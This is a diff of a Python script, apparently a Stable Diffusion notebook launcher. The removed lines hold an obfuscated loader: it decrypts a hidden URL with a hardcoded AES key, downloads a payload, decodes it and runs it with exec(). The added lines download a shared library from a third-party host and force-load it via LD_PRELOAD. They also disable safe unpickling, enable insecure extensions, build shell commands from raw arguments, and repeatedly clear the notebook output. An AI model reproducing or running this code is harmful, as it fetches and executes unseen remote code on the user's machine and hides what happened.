@@ -1,25 +1,65 @@
-import zlib, base64
-import requests
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+import subprocess
+import concurrent.futures
+from IPython.display import clear_output
+import os
+import sys
 
-def aes_decrypt(encrypted_text, key):
-    key = base64.b64decode(key)
-    cipher = AES.new(key, AES.MODE_ECB)
-    decrypted_text = unpad(cipher.decrypt(base64.b64decode(encrypted_text)), AES.block_size)
-    return decrypted_text.decode('utf-8')
+params = {}
+for arg in sys.argv[1:]:
+    if arg.startswith('--'):
+        key_value = arg[len('--'):].split('=')
+        if len(key_value) == 2:
+            key, value = key_value
+            params[key] = value
 
-def get_bytes(links):
-    response = requests.get(links)
-    if response.status_code == 200:
-        tbytes = response.content
-        return tbytes
+subprocess.run(f'git clone -b v1.5.1 --single-branch https://github.com/Lucysck/test1.git {params["dir"]}', shell=True)
 
-yd = "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
-"
-yd_key = "W8BWbk3Bi0/7fElbVvUOfw==" 
-yd_links = aes_decrypt(yd, yd_key)
-yd_bytes = get_bytes(yd_links)
-yd_code = base64.b64decode(zlib.decompress(yd_bytes))
+def run_git():
+    subprocess.run(f'cp -rf 1 /content/drive/MyDrive/sd/* {params["dir"]}', shell=True)
 
-exec(yd_code)
+def run_aria2c():
+    subprocess.run(f'aria2c --console-log-level=error -c -x 16 -s 16 -k 1M https://huggingface.co/spaces/weo1101/111/resolve/main/chilloutmix_NiPrunedFp32Fix-inpainting.inpainting.safetensors -d {params["dir"]}/models/Stable-diffusion -o chilloutmix_NiPrunedFp32Fix-inpainting.inpainting.safetensors', shell=True)
+
+def run_code():
+    subprocess.run(f"wget -O {params['dir']}/libtcmalloc_minimal.so.4 https://huggingface.co/Vanwise/sd-colab/resolve/main/libtcmalloc_minimal.so.4", shell=True)
+    os.environ['LD_PRELOAD'] = f"{params['dir']}/libtcmalloc_minimal.so.4"
+
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=3)
+task1 = executor.submit(run_git)
+task2 = executor.submit(run_aria2c)
+task3 = executor.submit(run_code)
+concurrent.futures.wait([task1, task2, task3])
+
+subprocess.run(f"wget -O {params['dir']}/config.json https://huggingface.co/spaces/weo1101/111/resolve/main/config.json", shell=True)
+
+import threading
+import time
+
+def clear_output_pro():
+    clear_output()
+    print("Clearing output...")
+    threading.Timer(30, clear_output_pro).start()
+
+threading.Timer(360, clear_output_pro).start()
+
+os.chdir(f'{params["dir"]}')
+clear_output()
+
+base_arg = "--disable-safe-unpickle --opt-sdp-attention --no-half-vae --enable-insecure-extension --theme=dark --lowram  --listen --xformer"
+
+if params["share"] == "True":
+    base_arg += " --share"
+
+if params["ngrok"]:
+    base_arg += f' --ngrok={params["ngrok"]} --ngrok-region="auto"'
+
+if params["cloudflared"] == "True":
+    base_arg += f" --cloudflared"
+
+if params["localhostrun"] == "True":
+    base_arg += f" --localhostrun"
+
+if params["remotemoe"] == "True":
+    base_arg += f" --remotemoe"
+
+subprocess.run(f"python launch.py {base_arg}", shell=True)
